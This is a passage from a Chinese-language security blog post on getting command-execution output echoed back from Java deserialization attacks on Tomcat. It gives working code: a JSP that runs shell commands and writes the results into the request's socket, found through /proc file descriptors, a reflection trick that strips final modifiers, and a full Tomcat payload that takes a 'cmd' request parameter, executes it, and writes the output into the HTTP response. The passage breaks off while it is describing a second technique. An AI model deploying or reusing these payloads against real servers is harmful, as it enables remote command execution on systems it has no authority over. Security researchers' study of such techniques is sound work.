<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"/"</span>))&#123;</span><br><span class="line">        String command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN&#123;FS=\"[\"&#125;''&#123;print $2&#125;'|sed 's/.$//'"</span>;  <span class="comment">//获取当前所有的Inode的值</span></span><br><span class="line">        String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res1 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        String line = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res1.add(line);  <span class="comment">//将所有的Inode添加到一个列表中</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep((<span class="keyword">long</span>)<span class="number">2000</span>); <span class="comment">//延时2秒</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">//pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk '&#123;print $9, $11&#125;'"</span>; <span class="comment">//获取延时2秒后的Inode和fd属性，理论上来讲应该和第一次获取的Inode不一样，但是无论是第一次获取的Inode还是延迟后获取的Inode都会包含我们本次请求的socket对应的Inode</span></span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        br = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res2 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res2.add(line);  <span class="comment">//获取延迟2秒后的socket的Inode</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res2.size(); i++)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                String socketNo = ((String)res2.get(i)).split(<span class="string">"\\s+"</span>)[<span class="number">1</span>].substring(<span class="number">8</span>); <span class="comment">//从res2中得到Inode</span></span><br><span class="line">                socketNo = socketNo.substring(<span class="number">0</span>, socketNo.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res1.size(); j++)&#123; </span><br><span class="line">                    <span class="keyword">if</span>(!socketNo.equals(res1.get(j))) <span class="keyword">continue</span>; <span class="comment">//判断延迟后的Inode是否在第一次请求的Inode中，如果不在则说明是新建立的socket，如果在则有可能是我们本次请求的socket。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(Integer.parseInt(socketNo) &gt; max) &#123; <span class="comment">//判断获取的Inode是否是最大的，如果是最大的，也就代表最新的一个socket，则有可能是我们请求的socket。</span></span><br><span class="line">                        max = Integer.parseInt(socketNo);</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                <span class="comment">//pass</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = Integer.parseInt(((String)res2.get(index)).split(<span class="string">"\\s"</span>)[<span class="number">0</span>]); <span class="comment">//获取到Inode最大的文件描述符fd的值。</span></span><br><span class="line">        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);//获取FileDescriptor的构造器</span><br><span class="line">        c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"id"</span>&#125;;</span><br><span class="line">        String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next(); <span class="comment">//执行我们想要执行的命令</span></span><br><span class="line">        String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + res.length() + <span class="string">"\n\n"</span> + res + <span class="string">"\n"</span>;</span><br><span class="line">        java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(fd)&#125;)); <span class="comment">//获取通过fd获取socket的FileOutputStream输出流</span></span><br><span class="line">        os.write(result.getBytes()); <span class="comment">// 将命令执行的结果进行写入</span></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​        通过这种方式可以增加找到我们本次socket请求的概率，但是也不能保证写入的一定是我们本次请求的socket。如果写入的不是我们本次请求的socket，则可能会导致异常。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222163940568.png" alt="image-20201222163940568"></p>
<h3 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h3><h4 id="lastServicedResponse获取response对象"><a href="#lastServicedResponse获取response对象" class="headerlink" title="lastServicedResponse获取response对象"></a>lastServicedResponse获取response对象</h4><p>​        之前我们了解了windows和Linux的回显方法，这些方法的基本思路是找到我们请求的那条数据的socket的文件描述符，向请求的响应中写入命令执行的结果，那么我们能不能在http层面去获取到当前HTTP请求的响应，并在响应中写入我们的回显。在java web中存在HttpServletResponse和HttpServletResponse对象，通过这两个对象我们可以对请求和响应进行处理，比如我们可以通过<code>response.getWriter().write()</code>将响应内容发送到缓冲区，并刷新缓冲区发送回显，测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">index</span><span class="params">(String input, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String xxx=<span class="string">"test666"</span>;</span><br><span class="line">    Writer writer = response.getWriter();</span><br><span class="line">    writer.write(xxx);</span><br><span class="line">    writer.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174453051.png" alt="image-20201222174453051"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174459580.png" alt="image-20201222174459580"></p>
<p>​        这个是我们直接修改源代码实现的结果，在实际使用过程中我们可能是需要通过反射来执行命令的，<strong>我们如何才能通过反射调用获取本次请求的response对象？</strong></p>
<p>​        一般来说，HttpServletResponse实例化的对象已经被加载到内存中，我们无法通过反射调用来获取这个对象中的内容，所以比较好的方法是去寻找HttpServletResponse对象在哪里被存储过，再通过反射调用获取存储HttpServletResponse的变量的值，再调用write将命令执行的结果写入返回内容。</p>
<p>​        参考先知上<code>Tomcat中一种半通用回显方法</code>,作者发现了ApplicationFilterChain的lastServicedResponse记录了response的内容。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181211815.png" alt="image-20201222181211815"></p>
<p>​        因此我们可以通过调用getLastServicedResponse来获取ServletResponse对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181321356.png" alt="image-20201222181321356"></p>
<p>​        我们还需要确定response的对象在整个传输链中代表的是否是一个对象，我将执行到index是的response对象和ApplicationFilterChain中的response对象做一个对比，发现是一个对象，所以我们在ApplicationFilterChain获取的response</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181748658.png" alt="image-20201222181748658"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181935267.png" alt="image-20201222181935267"></p>
<p>​        而且lastServicedResponse是static final修饰的，也就是说这个属性一旦赋值后就不能更改。并且还通过ThreadLocal进行修饰，这代表这个属性只能在当前线程中进行调用。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222183335083.png" alt="image-20201222183335083"></p>
<p>​        但是想要执行到赋值操作，需要ApplicationDispatcher.WRAP_SAME_OBJECT的属性为true，但是这个属性默认为false,也就是说默认不会执行这个赋值语句。所以我们需要通过反射来获取ApplicationDispatcher.WRAP_SAME_OBJECT属性，并对这个属性的值进行更改。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222191217452.png" alt="image-20201222191217452"></p>
<p>​        通过上面的分析，要通过这种思路完成tomcat下的回显 ，需要如下步骤</p>
<ul>
<li><p>通过反射获取WRAP_SAME_OBJECT_FIELD，并将这个值设置为true</p>
</li>
<li><p>通过反射获取lastServicedRequest和lastServicedResponse属性，从lastServicedRequest获取当前的request对象，通过request对象获取请求参数。通过lastServicedResponse获取response对象，并获取到response的write方法。</p>
</li>
<li><p>执行命令并将命令执行的结果写入到response中。</p>
<p>由于我们需要修改的属性lastServicedRequest和lastServicedResponse都是final static修饰的变量，因此，我们得了解如何通过反射来设置final static修饰的变量。</p>
<p>​        我写了一个小Demo，代码如下：</p>
<p>test.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String test666 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getTest666</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> test666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GetTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行上面的代码，会返回如下报错，也就是说无法通过set方法给由final修饰的属性赋值，因为一般final代表的是一个常量，一般不允许我们去修改常量的值。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092542124.png" alt="image-20201223092542124"></p>
<p>​        在Filed类中，可以通过getModifiers方法获取Filed的modifiers属性。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092911018.png" alt="image-20201223092911018"></p>
<p>​    这个属性的值代表了用户的访问权限</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x00000001(十六进制) = 1(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PUBLIC           = <span class="number">1</span>;</span><br><span class="line"> <span class="comment">//0x00000002(十六进制) = 2(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PRIVATE          = <span class="number">2</span>;   </span><br><span class="line"> <span class="comment">//0x00000004(十六进制) = 4(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PROTECTED        = <span class="number">4</span>;  </span><br><span class="line"> <span class="comment">//0x00000008(十六进制) = 8(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> STATIC           = <span class="number">8</span>;  </span><br><span class="line"> <span class="comment">//0x00000010(十六进制) = 16(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FINAL            = <span class="number">16</span>;</span><br></pre></td></tr></table></figure>

<p>​        如果我们的修饰符是由<code>private static final</code>来修饰的,modifiers属性的值也就是26。所以我们如果要对final修饰的变量进行赋值，就要重新设置这个变量的modifiers属性。代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        Field  modifiersField = Field.class.getDeclaredField("modifiers");  //获取Field类的modifiers属性</span><br><span class="line">        modifiersField.setAccessible(<span class="keyword">true</span>);  <span class="comment">//设置属性的访问权限</span></span><br><span class="line">        modifiersField.setInt(test666, test666.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//重新设置test666变量的modifiers属性</span></span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行该代码，我们可以看到，没有设置前test666变量的modifiers属性为26，设置后更改为10，也就是去掉了test666变量的final修饰符。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093651210.png" alt="image-20201223093651210"></p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093748773.png" alt="image-20201223093748773"></p>
<p>​        理解了这个知识点，我们来看一下使用tomcat回显的整体代码实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);  <span class="comment">//获取ApplicationDispatcher类的WRAP_SAME_OBJECT属性。</span></span><br><span class="line">     Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest"); //获取ApplicationFilterChain的lastServicedRequest属性</span><br><span class="line">     Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse"); //获取ApplicationFilterChain的lastServicedResponse属性</span><br><span class="line">     Field  modifiersField = Field.class.getDeclaredField("modifiers"); //获取Field的modifiers属性</span><br><span class="line">     modifiersField.setAccessible(<span class="keyword">true</span>); <span class="comment">//这个属性是由private修饰的，所以需要设置访问权限</span></span><br><span class="line">     modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//去掉WRAP_SAME_OBJECT_FIELD的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedRequestField的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedResponseField的final修饰</span></span><br><span class="line">     WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">     ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="keyword">null</span>);<span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。lastServicedRequest进行初始化</span></span><br><span class="line">     <span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     String cmd = lastServicedRequest != <span class="keyword">null</span></span><br><span class="line">             ? lastServicedRequest.get().getParameter(<span class="string">"cmd"</span>)</span><br><span class="line">             : <span class="keyword">null</span>; <span class="comment">//判断lastServicedRequest中是否为NULL，如果为NULL说明还不能获取request中的内容。</span></span><br><span class="line">     <span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="keyword">null</span> || lastServicedRequest == <span class="keyword">null</span>) &#123; <span class="comment">//判断WRAP_SAME_OBJECT是否为True,lastServicedResponse和lastServicedRequest内容是否为空</span></span><br><span class="line">         lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">// 初始化lastServicedRequest</span></span><br><span class="line">         lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">//初始化lastServicedResponse</span></span><br><span class="line">         WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>); <span class="comment">//设置WRAP_SAME_OBJECT_FIELD属性为True</span></span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">         ServletResponse responseFacade = lastServicedResponse.get();</span><br><span class="line">         java.io.Writer w = responseFacade.getWriter(); <span class="comment">//获取response.writer</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">         String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">         <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">             isLinux = <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">         InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">         Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">         String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">         w.write(output);  <span class="comment">//写入命令执行结果</span></span><br><span class="line">         w.flush();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>​        最后效果如下，由于第一次请求时WRAP_SAME_OBJECT_FIELD属性为false所以不会给lastServicedResponse赋值，因此在第一次访问时是无法获取命令执行结果的，后来再去请求，就可以正常执行命令了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223104155616.png" alt="image-20201223104155616"></p>
<h4 id="AbstractProcessor获取response对象"><a href="#AbstractProcessor获取response对象" class="headerlink" title="AbstractProcessor获取response对象"></a>AbstractProcessor获取response对象</h4><p>​        参考<code>基于全局储存的新思路 | Tomcat的一种通用回显方法研究</code>的文章，可以通过其他方法来寻找request和response对象被tomcat存储过的地方。经过寻找，发现AbstractProcessor中会存储request和response对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113516089.png" alt="image-20201223113516089"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113558202.png" alt="image-20201223113558202"></p>
<p>​        但是AbstractProcessor类的request和response不是由static修饰的，也就是说我们想要获取这两个属性，就需要获取到AbstractProcessor对象。在打断点调试的过程中，发现tomcat会去创建Http11Processor对象，而Http11Processor是AbstractProcessor的子类，所以我们只要获取到Http11Processor对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114132149.png" alt="image-20201223114132149"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114257847.png" alt="image-20201223114257847"></p>
<p>​        所以需要查看哪里存储了processor对象，我们可以看到当获取了processor对象后，调用了register方法，并且传入了processor对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134031429.png" alt="image-20201223134031429"></p>
<p>​        在register中，获取了RequestInfo，并调用了setGlobalProcessor，并传入了this.global。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134142611.png" alt="image-20201223134142611"></p>
<p>​        传入的this.global也就是ConnectionHandler的global,而这个global是RequestGroupInfo对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144452026.png" alt="image-20201223144452026"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144535512.png" alt="image-20201223144535512"></p>
<p>​        跟进setGlobalProcessor,调用了addRequestProcessor并传入了this也就是requestInfo对象</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134402832.png" alt="image-20201223134402832"></p>
<p>​        继续跟进，将RequestInfo添加到了this.processors中</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134438913.png" alt="image-20201223134438913"></p>
<p>​        也就是将请求的requestinfo信息保存在了ConnectionHandler的global中。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144922321.png" alt="image-20201223144922321"></p>
<p>​        所以我们现在也可以考虑先获取AbstractProtocol对象，经过查找发现CoyoteAdapter类调用了connector，而connector中包含了</p>
